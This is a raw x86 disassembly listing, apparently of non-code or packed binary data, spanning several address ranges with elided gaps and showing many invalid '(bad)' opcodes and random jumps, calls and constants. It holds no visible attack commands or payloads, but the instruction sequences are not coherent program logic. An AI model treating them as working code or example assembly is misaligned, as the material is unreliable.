  417db8:	gs aaa 
  417dba:	dec    esp
  417dbb:	cmp    edi,DWORD PTR [ebx+ecx*2-0x2d362ff0]
  417dc2:	mov    fs,edi
  417dc4:	lds    ebx,FWORD PTR [eax+0x48]
  417dc7:	mov    esi,0x6ee433e3
  417dcc:	fadd   DWORD PTR [edi+0x2158fd64]
  417dd2:	push   ecx
  417dd3:	cmp    BYTE PTR [ebp-0x2b],0x2
  417dd7:	imul   ecx,DWORD PTR [edx+0x33],0x591d30ef
  417dde:	cdq    
  417ddf:	jno    0x417dd0
  417de1:	cdq    
  417de2:	popf   
  417de3:	ret    0xeed3
  417de6:	ds repnz mov al,0x27
  417dea:	fisub  DWORD PTR [edi]
  417dec:	add    bl,BYTE PTR [edx+0x0]
	...
  417e53:	add    BYTE PTR [eax],al
  417e55:	add    BYTE PTR [edi],dl
  417e57:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417e5d:	addr16 dec esi
  417e5f:	sub    BYTE PTR [ecx+0x46],ch
  417e62:	push   esp
  417e63:	repnz rcl BYTE PTR [edi+eiz*2],1
  417e67:	add    DWORD PTR [ecx],eax
  417e69:	add    BYTE PTR [eax],al
  417e6b:	add    DWORD PTR [eax],eax
  417e6d:	add    BYTE PTR [esi],dl
  417e6f:	xchg   ecx,eax
  417e70:	sub    ch,dl
  417e72:	int    0xcb
  417e74:	fidivr WORD PTR [esi-0x32]
  417e77:	loop   0x417eb6
  417e79:	fsubr  DWORD PTR [ecx+0x6d]
  417e7c:	mov    ds:0xa5cae3ca,al
  417e81:	sub    al,al
  417e83:	lds    esi,FWORD PTR ds:0x311f847b
  417e89:	imul   ebp,DWORD PTR [esi-0x71],0x7f
  417e8d:	pop    edx
  417e8e:	push   edi
  417e8f:	int    0xbe
  417e91:	in     al,0x38
  417e93:	xchg   edx,eax
  417e94:	in     eax,0xef
  417e96:	dec    edx
  417e97:	mov    cl,0xbd
  417e99:	lds    edx,FWORD PTR [esi+0x157965f7]
  417e9f:	(bad)  
  417ea0:	dec    edi
  417ea1:	loope  0x417e6e
  417ea3:	pusha  
  417ea4:	repz push esi
  417ea6:	inc    eax
  417ea7:	fwait
  417ea8:	aam    0x39
  417eaa:	push   edx
  417eab:	mov    ecx,0x75506666
  417eb0:	jne    0x417ec5
  417eb2:	in     eax,0x76
  417eb4:	or     al,0x3d
  417eb6:	lock xchg ebx,eax
  417eb8:	xchg   ecx,eax
  417eb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417eba:	push   edi
  417ebb:	ror    eax,0x76
  417ebe:	test   DWORD PTR [ebx+ebp*2-0x6d],edi
  417ec2:	ja     0x417e7c
  417ec4:	cli    
  417ec5:	fcmovu st,st(1)
  417ec7:	mov    BYTE PTR [edi-0x199186ca],bh
  417ecd:	add    DWORD PTR [eax-0x4c],esp
  417ed0:	add    esp,ebx
  417ed2:	xor    edx,DWORD PTR [edx-0x6f]
  417ed5:	outs   dx,BYTE PTR ds:[esi]
  417ed6:	or     DWORD PTR [edi+0x65],esi
  417ed9:	mov    ch,BYTE PTR [edi]
  417edb:	adc    DWORD PTR [esi],0x70
  417ede:	jmp    DWORD PTR [ebx+0x1a]
  417ee1:	(bad)  
  417ee2:	mov    ds:0x928a955b,al
  417ee7:	or     eax,0xd4b56819
  417eec:	je     0x417f1d
  417eee:	mov    DWORD PTR [ecx],ebx
  417ef0:	inc    esi
  417ef1:	je     0x417e81
  417ef3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ef4:	in     al,dx
  417ef5:	leave  
  417ef6:	jae    0x417f67
  417ef8:	jno    0x417e9f
  417efa:	ss push es
  417efc:	jle    0x417f3c
  417efe:	add    esi,DWORD PTR [edx]
  417f00:	push   edx
  417f01:	sbb    BYTE PTR [edx],0x94
  417f04:	xor    al,0x25
  417f06:	(bad)  
  417f07:	(bad)  
  417f08:	mov    ecx,0xf84918de
  417f0d:	fwait
  417f0e:	sub    BYTE PTR [edi+0x1c19e2ff],0xa6
  417f15:	adc    al,0x5f
  417f17:	inc    edi
  417f18:	mov    edx,0xdd7783e7
  417f1d:	dec    edx
  417f1e:	test   al,0x62
  417f20:	push   ds
  417f21:	arpl   ax,si
  417f23:	sbb    bh,0x16
  417f26:	xor    esi,esi
  417f28:	cmp    ecx,DWORD PTR [edi+0x4f37d08c]
  417f2e:	adc    DWORD PTR ds:0xeb1c6b9,ebp
  417f34:	push   ebp
  417f35:	sar    BYTE PTR [edx],cl
  417f37:	or     eax,DWORD PTR [eax]
  417f39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f3a:	les    ebx,FWORD PTR [eax-0x5b8b3cfe]
  417f40:	pusha  
  417f41:	inc    edi
  417f42:	popf   
  417f43:	or     al,0x6b
  417f45:	pop    eax
  417f46:	(bad)  
  417f47:	call   0xa67bfaa7
  417f4c:	cmp    DWORD PTR [esi],ecx
  417f4e:	sbb    ch,al
  417f50:	fcomp  DWORD PTR [edi+ebx*2]
  417f53:	push   edi
  417f54:	mov    DWORD PTR [edi-0x29ffc7f],ebx
  417f5a:	lock sbb bl,BYTE PTR [edi-0x2b]
  417f5e:	pusha  
  417f5f:	jl     0x417fc1
  417f61:	or     DWORD PTR [eax+0x42fd2333],edx
  417f67:	lock (bad) 
  417f69:	pop    edx
  417f6a:	sub    BYTE PTR [edi+esi*1],dh
  417f6d:	cdq    
	...
  417fd6:	(bad)  
  417fd7:	out    0xe6,al
  417fd9:	cmp    esp,esi
  417fdb:	cmp    edi,edi
  417fdd:	push   DWORD PTR [edx]
  417fdf:	xchg   edx,eax
  417fe0:	xor    al,bh
  417fe2:	add    DWORD PTR [ecx],ecx
  417fe4:	pop    esi
  417fe5:	dec    eax
  417fe6:	add    al,BYTE PTR [bx+di]
  417fe9:	add    BYTE PTR [eax],al
  417feb:	add    DWORD PTR [eax],eax
  417fed:	add    ah,ah
  417fef:	pop    edi
  417ff0:	pop    esp
  417ff1:	loop   0x417fd2
  417ff3:	jbe    0x418038
  417ff5:	arpl   WORD PTR [ebp+0x6eea2ee0],cx
  417ffb:	adc    ebp,0xf1774f1c
  418001:	loop   0x418078
  418003:	scas   al,BYTE PTR es:[edi]
  418004:	pop    ecx
  418005:	sub    DWORD PTR [edx-0x208fc033],ebp
  41800b:	nop
  41800c:	mov    eax,ds:0xf82104a8
  418011:	xor    BYTE PTR [edx+esi*8+0x7f],0x51
  418016:	add    DWORD PTR [edi+0x65],0x8a453575
  41801d:	dec    DWORD PTR [ebx]
  41801f:	jmp    FWORD PTR [ecx]
  418021:	data16 daa 
  418023:	nop
  418024:	xor    ch,BYTE PTR [ebp-0x1957e2af]
  41802a:	push   ecx
  41802b:	loope  0x418026
  41802d:	ror    BYTE PTR [esi-0x3a],cl
  418030:	push   cs
  418031:	xchg   esi,eax
  418032:	inc    esp
  418033:	xchg   ebp,eax
  418034:	xor    ah,ah
  418036:	punpckhdq mm5,QWORD PTR [ecx]
  418039:	jle    0x418007
  41803b:	add    cl,al
  41803d:	in     al,dx
  41803e:	push   0xffffffcf
  418040:	test   dl,cl
  418042:	or     dl,bl
  418044:	push   esi
  418045:	push   esi
  418046:	fwait
  418047:	jmp    0xd5f27008
  41804c:	pop    ebx
  41804d:	adc    edx,DWORD PTR [esi]
  41804f:	shl    BYTE PTR [ecx-0x6af8cb73],0x7a
  418056:	scas   eax,DWORD PTR es:[edi]
  418057:	cmp    bl,BYTE PTR [ecx]
  418059:	stos   DWORD PTR es:[edi],eax
  41805a:	cmc    
  41805b:	rol    esp,cl
  41805d:	(bad)  
  41805e:	cwde   
  41805f:	pushfw 
  418061:	gs cmp ebx,edi
  418064:	xlat   BYTE PTR ds:[ebx]
  418065:	das    
  418066:	adc    al,dh
  418068:	std    
  418069:	clc    
  41806a:	dec    esp
  41806b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41806c:	retf   
  41806d:	or     dl,BYTE PTR [edx+0x16cecffb]
  418073:	xor    bl,dl
  418075:	call   0x5460:0x87bffba7
  41807c:	fidivr DWORD PTR [edi-0x330ce2ae]
  418082:	mov    dl,0xa8
  418084:	ret    
  418085:	pop    es
  418086:	jo     0x4180aa
  418088:	sbb    eax,0xe363560e
  41808d:	(bad)  
  41808f:	addr16 fdivr st(5),st
  418092:	sub    DWORD PTR [esi],edx
  418094:	int    0x40
  418096:	jae    0x418113
  418098:	inc    ebp
  418099:	pop    eax
  41809a:	mov    esp,0xab7ac789
  41809f:	test   BYTE PTR [edi],al
  4180a1:	jno    0x418029
  4180a3:	lods   eax,DWORD PTR ds:[esi]
  4180a4:	jae    0x418103
  4180a6:	xchg   esi,eax
  4180a7:	inc    edi
  4180a8:	aad    0x62
  4180aa:	xor    ch,0xfc
  4180ad:	fnsave [ecx-0x75f2ad41]
  4180b3:	jg     0x4180ee
  4180b5:	cmp    DWORD PTR [ebx+ecx*2+0x7e],eax
  4180b9:	(bad)  
  4180ba:	fidiv  WORD PTR [edi+0x1d]
  4180bd:	jp     0x418041
  4180bf:	(bad)  
  4180c0:	pop    esi
  4180c1:	int    0xe7
  4180c3:	jno    0x4180df
  4180c5:	adc    al,BYTE PTR [ecx+0x2112b064]
  4180cb:	cmp    eax,0xdeabed29
  4180d0:	fdivr  st,st(5)
  4180d2:	mov    bh,0x61
  4180d4:	mov    ebp,0xfa218ec2
  4180d9:	add    ah,bh
  4180db:	call   0xd30b:0x97438f5b
  4180e2:	pop    esp
  4180e3:	jmp    0x8441:0x119a2279
  4180ea:	cli    
  4180eb:	fnsave [edx+0x8e]
	...
  418155:	add    BYTE PTR [ecx-0xba9482],ch
  41815b:	push   ebp
  41815c:	scas   eax,DWORD PTR es:[edi]
  41815d:	(bad)  
  41815e:	mov    ds:0x7f2fdebc,eax
  418163:	outs   dx,DWORD PTR ds:[esi]
  418164:	mov    DWORD PTR [ecx],esp
  418166:	add    eax,DWORD PTR [bx+di]
  418169:	add    BYTE PTR [eax],al
  41816b:	add    DWORD PTR [eax],eax
  41816d:	add    ah,ch
  41816f:	daa    
  418170:	fs ins BYTE PTR es:[edi],dx
  418172:	ret    
  418173:	fisttp DWORD PTR [ecx]
  418175:	sub    bl,cl
  418177:	loopne 0x418101
  418179:	scas   eax,DWORD PTR es:[edi]
  41817a:	sub    DWORD PTR [esi-0x15],0x2
  41817e:	xor    bh,BYTE PTR [edi-0x63]
  418181:	sbb    al,0x5b
  418183:	aad    0x34
  418185:	mov    dh,0xae
  418187:	xchg   ecx,eax
  418188:	popa   
  418189:	mov    esi,0x4d16da14
  41818e:	adc    al,0x9b
  418190:	int    0xe7
  418192:	mov    ecx,0x549d3cdb
  418197:	xchg   esi,eax
  418198:	imul   ecx,edx,0x69
  41819b:	or     BYTE PTR es:[ebp+0x57],dh
  41819f:	lods   al,BYTE PTR ds:[esi]
  4181a0:	cmp    eax,0x7dbc1636
  4181a5:	dec    esi
  4181a6:	leave  
  4181a7:	out    0xd8,eax
  4181a9:	sub    ebp,eax
  4181ab:	(bad)  
  4181ac:	lea    ecx,[eax-0x68]
  4181af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181b0:	mov    bl,0xbd
  4181b2:	jns    0x41821f
  4181b4:	pop    ss
  4181b5:	fcom   QWORD PTR [edx+0x50]
  4181b8:	lds    esi,FWORD PTR [edx]
  4181ba:	push   cs
  4181bb:	xchg   ecx,eax
  4181bc:	and    eax,0xeb75f51a
  4181c1:	mov    esp,0x6c0987bc
  4181c6:	mov    ecx,0xaa84ca8b
  4181cb:	xchg   esp,eax
  4181cc:	jle    0x418234
  4181ce:	and    BYTE PTR [esi-0x25],dl
  4181d1:	rcr    DWORD PTR [eax-0x106baf9f],cl
  4181d7:	mov    dh,0x7d
  4181d9:	je     0x4181dd
  4181db:	xchg   eax,esp
  4181dd:	clc    
  4181de:	adc    esi,eax
  4181e0:	(bad)  
  4181e1:	arpl   WORD PTR [ebx+0x26],di
  4181e4:	dec    edx
  4181e5:	test   BYTE PTR [edi-0x5d14fd3e],0x9d
  4181ec:	inc    ebp
  4181ed:	test   al,0x6a
  4181ef:	cmc    
  4181f0:	jp     0x4181b0
  4181f2:	adc    esi,DWORD PTR [esi-0x4d]
  4181f5:	mov    esp,0x3a16c21a
  4181fa:	pop    ebx
  4181fb:	pop    esi
  4181fc:	inc    BYTE PTR ds:0xa28d3a84
  418202:	mov    DWORD PTR [ebx+0x3d025d08],esp
  418208:	add    ah,dh
  41820a:	das    
  41820b:	in     al,dx
  41820c:	pop    esp
  41820d:	inc    esp
  41820e:	jmp    DWORD PTR [esp+edx*2+0x59]
  418212:	cmp    BYTE PTR [edx+0x76fa1c95],bl
  418218:	int3   
  418219:	jg     0x418290
  41821b:	or     al,dh
  41821d:	sub    BYTE PTR [edx],0xb9
  418220:	jo     0x418261
  418222:	jne    0x4181ed
  418224:	shl    BYTE PTR [ecx-0x3],0x41
  418228:	xor    DWORD PTR [ebx-0x2b8d8be4],ecx
  41822e:	dec    esp
  41822f:	adc    eax,0xb2795563
  418234:	(bad)  
  418236:	push   cs
  418237:	push   esi
  418238:	popf   
  418239:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41823a:	scas   eax,DWORD PTR es:[edi]
  41823b:	jge    0x418259
  41823d:	jge    0x41821b
  41823f:	sbb    DWORD PTR [eax+ebx*8],edx
  418242:	bound  esp,QWORD PTR [edx-0x26]
  418245:	mov    ebx,0x936121d8
  41824a:	mov    esi,0x5c23b56e
  41824f:	shl    BYTE PTR [ebx+0x22da18fb],cl
  418255:	sbb    BYTE PTR [esi+0x3f2d45],bl
  41825b:	xchg   DWORD PTR [ecx+0x26],esp
  41825e:	addr16 (bad) 
  418260:	mov    eax,0x9ffdaf33
  418265:	sub    ebx,DWORD PTR [ecx-0x3cf080e2]
  41826b:	cmp    al,0x15
  41826d:	and    al,0x0
	...
  4182d3:	add    BYTE PTR [eax],al
  4182d5:	add    BYTE PTR [edi],dh
  4182d7:	xchg   edx,eax
  4182d8:	and    al,0x83
  4182da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182db:	mov    bh,0xb7
  4182dd:	mov    dh,0x40
  4182df:	mov    ebx,0x8f46b8d6
  4182e4:	loope  0x4182ac
  4182e6:	addr16 add al,0x1
  4182e9:	add    BYTE PTR [eax],al
  4182eb:	add    DWORD PTR [eax],eax
  4182ed:	add    BYTE PTR [esi+eiz*8-0x2528f289],bl
  4182f4:	repz and eax,0xe0061599
  4182fa:	les    ecx,FWORD PTR [edx+0x737fc177]
  418300:	into   
  418301:	and    al,0x2c
  418303:	jne    0x418325
  418305:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418306:	ds push es
  418308:	shl    DWORD PTR [ecx-0x34],0x44
  41830c:	inc    ebp
  41830d:	repz aad 0xd0
  418310:	aam    0x2a
  418312:	fsubr  st,st(2)
  418314:	sti    
  418315:	mov    esi,0x24aed9db
  41831a:	rcr    DWORD PTR [esi+0x6067e5ee],0x39
  418321:	push   ebx
  418322:	dec    eax
  418323:	xor    edx,edi
  418325:	or     eax,0x8324178f
  41832a:	mov    ds:0x884e0920,al
  41832f:	fcmovnu st,st(1)
  418331:	ror    BYTE PTR [eax-0x17],0x52
  418335:	mov    al,0x6e
  418337:	in     eax,0xe0
  418339:	or     DWORD PTR [ecx+0x17],esp
  41833c:	or     DWORD PTR [esi-0x33],0x1b63fcfd
  418343:	jecxz  0x4182ca
  418345:	stos   BYTE PTR es:[edi],al
  418346:	or     ch,BYTE PTR [ecx+edx*1]
  418349:	push   edi
  41834a:	or     eax,DWORD PTR [eax-0x42]
  41834d:	push   ds
  41834e:	sahf   
  41834f:	les    edx,FWORD PTR [edx+0x22d47bff]
  418355:	push   ds
  418356:	loop   0x4182f8
  418358:	call   0xfb15:0x6efb9e8a
  41835f:	mov    ah,0x50
  418361:	add    DWORD PTR [edi-0x2516297d],edi
  418367:	push   es
  418368:	cmp    ah,BYTE PTR [esi]
  41836a:	or     bh,BYTE PTR [ecx]
  41836c:	cs inc edi
  41836e:	mov    ch,0xf4
  418370:	mov    esi,0x6f0ee9a1
  418375:	test   eax,0x54aab031
  41837a:	daa    
  41837b:	and    al,0x2
  41837d:	dec    ebp
  41837e:	outs   dx,DWORD PTR ds:[esi]
  41837f:	and    ebp,eax
  418381:	ins    BYTE PTR es:[edi],dx
  418382:	jmp    0xc641:0x7e9e1e1c
  418389:	mov    esi,0x8dfd11cb
  41838e:	xchg   edx,eax
  41838f:	out    dx,al
  418390:	push   es
  418391:	mov    ah,0xe0
  418393:	jne    0x41839e
  418395:	clc    
  418396:	outs   dx,BYTE PTR ds:[esi]
  418397:	(bad)  
  418399:	lods   al,BYTE PTR ds:[esi]
  41839a:	into   
  41839b:	jge    0x418339
  41839d:	pop    edx
  41839e:	fidivr DWORD PTR [edi-0x235195dc]
  4183a4:	dec    eax
  4183a5:	pop    ss
  4183a6:	jg     0x41839d
  4183a8:	xchg   ebx,eax
  4183a9:	scas   eax,DWORD PTR es:[edi]
  4183aa:	push   ebx
  4183ab:	inc    esi
  4183ac:	les    ebp,FWORD PTR [ecx]
  4183ae:	adc    DWORD PTR [esp+edi*8],0xb4ba6aba
  4183b5:	sbb    ebx,ebx
  4183b7:	enter  0x4b47,0x43
  4183bb:	loope  0x418434
  4183bd:	xor    DWORD PTR [esi],ecx
  4183bf:	mov    edx,0xb69a2a1
  4183c4:	leave  
  4183c5:	bound  esp,QWORD PTR [edx-0x1c]
  4183c8:	sti    
  4183c9:	push   ds
  4183ca:	arpl   WORD PTR [ecx+edx*8+0x2f0d5879],dx
  4183d1:	clc    
  4183d2:	fistp  WORD PTR [edx]
  4183d4:	mov    ch,0x41
  4183d6:	adc    ecx,DWORD PTR [edx+0x15]
  4183d9:	ins    DWORD PTR es:[edi],dx
  4183da:	gs push esi
  4183dc:	fistp  DWORD PTR [edi+ebp*1+0x2a]
  4183e0:	in     eax,0x20
  4183e2:	xor    al,0x25
  4183e4:	retf   0xb43e
  4183e7:	jl     0x418399
  4183e9:	jmp    0x55d38ce7
	...
  418456:	fdiv   QWORD PTR [ebx-0x2380afc1]
  41845c:	(bad)  
  41845d:	mov    edi,0x14d871ac
  418462:	jecxz  0x4183ea
  418464:	xor    dl,BYTE PTR [eax+0x10567]
  41846a:	add    BYTE PTR [ecx],al
  41846c:	add    BYTE PTR [eax],al
  41846e:	sub    al,BYTE PTR [eax-0x8c79fd4]
  418474:	aas    
  418475:	inc    edx
  418476:	push   cs
  418477:	ret    0xd006
  41847a:	ds pop ds
  41847c:	(bad)  
  41847d:	repz std 
  41847f:	aam    0x83
  418481:	sub    cl,cl
  418483:	or     al,0x8a
  418485:	sar    DWORD PTR [ecx],cl
  418487:	cs sbb eax,0x19e23a9
  41848d:	pop    ecx
  41848e:	or     DWORD PTR [edi+esi*2+0x4aa94076],edi
  418495:	pop    ds
  418496:	sbb    eax,0x3fa4c133
  41849b:	cmp    dl,0x4b
  41849e:	jae    0x4184f2
  4184a0:	push   es
  4184a1:	iret   
  4184a2:	data16 jge 0x41842e
  4184a5:	inc    edi
  4184a6:	mov    ds:0x3961c5b,eax
  4184ab:	add    eax,DWORD PTR [ebp-0x3cb25404]
  4184b1:	push   esp
  4184b2:	(bad)  
  4184b4:	sar    BYTE PTR [ebx+ecx*1+0x13db8a6],1
  4184bb:	cmc    
  4184bc:	addr16 aas 
  4184be:	adc    BYTE PTR [ecx-0x661d89bf],dl
  4184c4:	fist   DWORD PTR [ebx-0x41fe2110]
  4184ca:	add    ch,bh
  4184cc:	mov    ch,0x54
  4184ce:	lods   eax,DWORD PTR ds:[esi]
  4184cf:	leave  
  4184d0:	and    DWORD PTR [ecx+0x3e2b28f0],0xffffff93
  4184d7:	mov    ebx,0xafb66ef2
  4184dc:	fadd   QWORD PTR [ebx+0x2871255a]
  4184e2:	ja     0x418537
  4184e4:	push   edi
  4184e5:	call   0x4875:0x6b7580be
  4184ec:	idiv   DWORD PTR [eax+ebp*1-0x6cb15e94]
  4184f3:	jmp    0x418509
  4184f5:	inc    esi
  4184f6:	stos   BYTE PTR es:[edi],al
  4184f7:	mov    BYTE PTR [ecx-0x3b],ah
  4184fa:	sbb    cl,BYTE PTR [esi]
  4184fc:	add    DWORD PTR [edx-0x2f1ee20],edx
  418502:	ret    0x2a09
  418505:	shl    BYTE PTR [eax],0xa5
  418508:	pop    ds
  418509:	mov    db6,edx
  41850c:	sbb    DWORD PTR [eax+eiz*2],ebp
  41850f:	mov    dh,0xc4
  418511:	add    DWORD PTR [ecx+0x13],eax
  418514:	mov    bh,BYTE PTR [edi+0x4e2b3724]
  41851a:	cmp    esp,DWORD PTR [edx-0x38]
  41851d:	ret    
  41851e:	out    0x76,al
  418520:	popa   
  418521:	repnz dec ecx
  418523:	pop    ss
  418524:	ins    DWORD PTR es:[edi],dx
  418525:	add    DWORD PTR ds:0x7dcc5598,ebp
  41852b:	les    esp,FWORD PTR [ecx+edx*1]
  41852e:	in     eax,0xaf
  418530:	(bad)  
  418531:	(bad)  
  418532:	addr16 cmc 
  418534:	push   ss
  418535:	sti    
  418536:	inc    esi
  418537:	in     al,0xf0
  418539:	and    BYTE PTR [esi+ecx*2+0x25],ch
  41853d:	dec    esp
  41853e:	and    dl,BYTE PTR [edi-0x5b2de3dc]
  418544:	(bad)  
  418545:	retf   0x7c4
  418548:	push   0x1586224f
  41854d:	cmp    DWORD PTR [edx+0x2f],edi
  418550:	dec    esi
  418551:	(bad)  
  418552:	jle    0x4184f9
  418554:	jbe    0x41852c
  418556:	mov    al,ds:0x5af276b8
  41855b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41855c:	(bad)  
  41855e:	jno    0x418522
  418560:	dec    ebp
  418561:	dec    ecx
  418562:	lds    esp,FWORD PTR [edi+0xd]
  418565:	lods   eax,DWORD PTR ds:[esi]
  418566:	nop
  418567:	jg     0x418561
  418569:	test   al,0x30
  41856b:	shr    BYTE PTR [edx+edi*4+0x0],0x0
	...
  4185d3:	add    BYTE PTR [eax],al
  4185d5:	add    BYTE PTR [ecx-0x7],al
  4185d8:	mov    ebx,ebx
  4185da:	mov    ebx,0x26fb51fb
  4185df:	lods   al,BYTE PTR ds:[esi]
  4185e0:	imul   dl
  4185e2:	mov    DWORD PTR [edi],ebx
  4185e4:	out    0x9a,al
  4185e6:	addr16 push es
  4185e8:	add    DWORD PTR [eax],eax
  4185ea:	add    BYTE PTR [ecx],al
  4185ec:	add    BYTE PTR [eax],al
  4185ee:	mov    ebp,0x1793edfb
  4185f3:	rcl    cl,0xf0
  4185f6:	jl     0x41865d
  4185f8:	pop    ds
  4185f9:	and    ebp,DWORD PTR [ecx+0x40]
  4185fc:	sub    ecx,DWORD PTR [ebx+ecx*8+0x3]
  418600:	adc    dl,BYTE PTR [edi+0x52]
  418603:	mov    esi,DWORD PTR [edi-0x1057650c]
  418609:	js     0x4185d1
  41860b:	add    BYTE PTR [ebx-0x1169d0ad],bl
  418611:	mov    al,dh
  418613:	mov    eax,ds:0x4a247981
  418618:	lods   eax,DWORD PTR fs:[esi]
  41861a:	ret    0xd204
  41861d:	xor    eax,0x418294ff
  418622:	mov    ch,0xe8
  418624:	dec    edx
  418625:	sbb    BYTE PTR [ebp+0x1],cl
  418628:	jp     0x4185e7
  41862a:	dec    eax
  41862b:	push   ebx
  41862c:	inc    eax
  41862d:	retf   0x3ba6
  418630:	dec    esp
  418631:	das    
  418632:	inc    ebp
  418633:	rcr    BYTE PTR [ecx+edx*8-0x3f],1
  418637:	or     DWORD PTR [ecx],ebx
  418639:	sahf   
  41863a:	mov    BYTE PTR [esp+edi*2],ah
  41863d:	xor    eax,0x71413360
  418642:	dec    DWORD PTR [ebx]
  418644:	jg     0x4186a7
  418646:	pop    ds
  418647:	xor    DWORD PTR [edx+0x6c],esi
  41864a:	out    dx,al
  41864b:	jno    0x418626
  41864d:	push   ds
  41864e:	mov    dh,0xda
  418650:	clc    
  418651:	mov    al,0xa8
  418653:	mov    ds:0xd7030bfb,al
  418658:	call   0x24069324
  41865d:	sub    esi,eax
  41865f:	jae    0x41861b
  418661:	pop    ebp
  418662:	mov    ah,0x2c
  418664:	xchg   ecx,eax
  418665:	sub    al,0xa2
  418667:	mov    ds:0x7aa4d8f8,al
  41866c:	cmp    al,0x89
  41866e:	push   cs
  41866f:	xlat   BYTE PTR ds:[ebx]
  418670:	jno    0x418699
  418672:	stos   DWORD PTR es:[edi],eax
  418673:	retf   0x28ae
  418676:	fcomi  st,st(1)
  418678:	and    dh,BYTE PTR [eax-0x1bb448b2]
  41867e:	fistp  DWORD PTR [ecx+0x67]
  418681:	or     DWORD PTR [esi],ebx
  418683:	loope  0x418657
  418685:	rcl    cl,cl
  418687:	nop
  418688:	sbb    bh,BYTE PTR [esi+0x243dc2da]
  41868e:	leave  
  41868f:	rcr    BYTE PTR [edx+0x77],cl
  418692:	mov    esi,DWORD PTR [esi]
  418694:	mov    dh,0xc3
  418696:	mov    gs,WORD PTR [edi+eiz*2+0x189b0096]
  41869d:	jno    0x418632
  41869f:	mov    esi,0x89be8c91
  4186a4:	pop    ss
  4186a5:	adc    bl,BYTE PTR [ecx-0x14]
  4186a8:	popf   
  4186a9:	and    DWORD PTR [ebx-0x1a2d7b42],esp
  4186af:	stos   BYTE PTR es:[edi],al
  4186b0:	out    0xd4,eax
  4186b2:	mov    eax,0x6e534950
  4186b7:	(bad)  
  4186b8:	das    
  4186b9:	push   0x9c3ef952
  4186be:	imul   DWORD PTR [esi-0x18]
  4186c1:	push   0xffffff95
  4186c3:	stos   DWORD PTR es:[edi],eax
  4186c4:	frstor [ecx]
  4186c6:	mov    ds:0xf89c31b1,eax
  4186cb:	aaa    
  4186cc:	(bad)  
  4186cd:	cs (bad) 
  4186cf:	in     al,dx
  4186d0:	mov    eax,ds:0xd06b1345
  4186d5:	sbb    BYTE PTR [eax-0x3f],bh
  4186d8:	sub    DWORD PTR [eax-0x5c],edi
  4186db:	jecxz  0x418713
  4186dd:	leave  
  4186de:	gs xchg edi,eax
  4186e0:	ins    BYTE PTR es:[edi],dx
  4186e1:	or     bh,BYTE PTR [ecx-0x202bd0fc]
  4186e7:	stos   DWORD PTR es:[edi],eax
  4186e8:	pop    esi
  4186e9:	mov    bh,0x98
  4186eb:	mov    dh,0xdb
  4186ed:	inc    ebp
	...
  418756:	xchg   ebx,eax
  418757:	sub    BYTE PTR [eax-0x604344c4],ah
  41875d:	scas   eax,DWORD PTR es:[edi]
  41875e:	or     al,0x8d
  418760:	cmp    edx,edx
  418762:	mov    bl,0xa1
  418764:	mul    BYTE PTR [eax]
  418766:	addr16 pop es
  418768:	add    DWORD PTR [eax],eax
  41876a:	add    BYTE PTR [ecx],al
  41876c:	add    BYTE PTR [eax],al
  41876e:	cli    
  41876f:	fnstsw WORD PTR [eax*8-0x4aced025]
  418776:	cmp    DWORD PTR [esi+0x3d692f54],ecx
  41877c:	cmp    eax,0xcd6c02e6
  418781:	xchg   ebp,eax
  418782:	mov    eax,0x8167ae62
  418787:	cmp    bl,ah
  418789:	jne    0x418805
  41878b:	add    DWORD PTR [edi+0x68bda4b7],0x5a
  418792:	inc    eax
  418793:	xor    al,0xd4
  418795:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418796:	mov    dh,0x15
  418798:	xor    esi,DWORD PTR [ebx]
  41879a:	arpl   WORD PTR [ebx+ecx*1+0x32],dx
  41879e:	adc    bh,bh
  4187a0:	dec    eax
  4187a1:	mov    esp,eax
  4187a3:	mov    cl,0x1e
  4187a5:	adc    edi,DWORD PTR [edi+0x2bce071e]
  4187ab:	inc    ebp
  4187ac:	inc    ebx
  4187ad:	and    eax,0x7dce4f94
  4187b2:	(bad)  
  4187b4:	retf   0x9d78
  4187b7:	xchg   esi,eax
  4187b8:	mov    eax,0x8cf2483e
  4187bd:	and    cl,BYTE PTR [edi-0x134b4d14]
  4187c3:	call   0x84e5:0x54092cf0
  4187ca:	push   ss
  4187cb:	pop    ebx
  4187cc:	dec    eax
  4187cd:	mov    eax,0xd0832c5b
  4187d2:	fst    DWORD PTR [esi]
  4187d4:	and    ebx,DWORD PTR [edi-0x66a03bce]
  4187da:	sub    dh,cl
  4187dc:	push   ebp
  4187dd:	pop    esi
  4187de:	mov    ds:0x92862e4c,al
  4187e3:	hlt    
  4187e4:	es test esp,0xb1639106
  4187eb:	jmp    0x418809
  4187ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187ee:	mov    ds:0xcc8be9d1,al
  4187f3:	xor    BYTE PTR [eax],ah
  4187f5:	jo     0x418843
  4187f7:	xchg   ecx,eax
  4187f8:	cmp    DWORD PTR [ecx+ebx*4-0x72],0x5b872e4
  418800:	adc    eax,DWORD PTR [eax-0x5102554e]
  418806:	sbb    BYTE PTR [ebp+edx*8+0x37],bl
  41880a:	dec    edx
  41880b:	inc    BYTE PTR [edx]
  41880d:	inc    ecx
  41880e:	fild   DWORD PTR [ebp-0x70]
  418811:	fwait
  418812:	(bad)  
  418813:	push   ebx
  418814:	jle    0x418799
  418816:	mov    ds:0x4f00c7cb,eax
  41881b:	pop    ebx
  41881c:	cdq    
  41881d:	jb     0x4187bb
  41881f:	stos   DWORD PTR es:[edi],eax
  418820:	scas   al,BYTE PTR es:[edi]
  418821:	jae    0x41886e
  418823:	int3   
  418824:	imul   BYTE PTR [ebx+0x1d7ca0fd]
  41882a:	or     al,0xfa
  41882c:	xor    al,0xdd
  41882e:	sahf   
  41882f:	sbb    eax,DWORD PTR [ebx-0x21]
  418832:	jge    0x418877
  418834:	(bad)  
  418836:	add    al,0xb8
  418838:	mov    ch,BYTE PTR [edi+0x34d0c985]
  41883e:	or     al,0x68
  418840:	push   edi
  418841:	cdq    
